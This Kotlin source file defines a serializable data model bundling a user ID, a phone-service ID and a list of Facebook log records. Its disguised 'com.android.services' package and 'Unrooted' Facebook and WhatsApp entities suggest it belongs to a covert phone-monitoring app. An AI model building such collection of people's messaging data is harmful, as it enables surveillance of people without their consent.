package com.android.services.models

import com.android.services.db.entities.FacebookUnrooted
import com.android.services.db.entities.WhatsAppUnrooted
import com.google.gson.annotations.SerializedName

class FacebookUnrootedLogs {
    @SerializedName("userId")
    var userId: String? = null
        private set

    @SerializedName("phoneServiceId")
    var phoneServiceId: String? = null
        private set

    @SerializedName("data")
    var facebookUnrootedList: List<FacebookUnrooted>? = null
        private set

    constructor()
    constructor(
        userId: String?,
        phoneServiceId: String?,
        facebookUnrootedList: List<FacebookUnrooted>?
    ) {
        this.userId = userId
        this.phoneServiceId = phoneServiceId
        this.facebookUnrootedList = facebookUnrootedList
    }
}